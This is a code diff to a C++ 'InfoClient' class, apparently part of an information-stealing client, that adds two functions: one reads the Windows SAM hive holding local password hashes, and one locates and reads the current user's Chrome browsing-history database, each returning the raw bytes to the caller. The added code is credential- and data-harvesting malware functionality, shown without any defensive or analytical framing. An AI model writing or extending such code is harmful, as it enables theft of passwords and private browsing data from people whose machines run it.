@@ -114,3 +114,58 @@ std::string InfoClient::getUUID() {
 	}
 	return (result);
 }
+
+int	InfoClient::getSAMHive(char **output) {
+	std::string path;
+	std::ifstream file;
+	int length;
+
+	path = "C:/Windows/System32/config/SAM";
+	file.open(path);
+	if (file.is_open() == false) {
+		std::cout << "This : ";
+		perror("why:");
+		std::cout << path << std::endl;
+		return (-1);
+	}
+	file.seekg(0, std::ios::end);
+	length = (int)file.tellg();
+	file.seekg(0, std::ios::beg);
+	char *buffer = (char*)malloc(sizeof(char) * length);
+	file.read(buffer, length);
+	*output = buffer;
+	file.close();
+	return (length);
+}
+
+int InfoClient::getHistory(char **output) {
+	std::string path;
+	std::ifstream file;
+	char name[255] = { 0 };
+	DWORD _nbuffer = 255;
+	int length;
+
+	path += "C:/Users/";
+	if (GetUserName((LPWSTR)name, &_nbuffer) == false) {
+		std::cout << "No Username" << std::endl;
+	}
+	for (int i = 0; i < 255; i++) {
+		if (name[i] != 0) {
+			path += name[i];
+		}
+	}
+	path += "/AppData/Local/Google/Chrome/User Data/Default/History";
+	file.open(path);
+	if (file.is_open() == false) {
+		std::cout << "This : "  << path << std::endl;
+		return (-1);
+ 	}
+	file.seekg(0, std::ios::end);
+	length = (int)file.tellg();
+	file.seekg(0, std::ios::beg);
+	char *buffer = (char*)malloc(sizeof(char) * length);
+	file.read(buffer, length);
+	*output = buffer;
+	file.close();
+	return (length);
+}
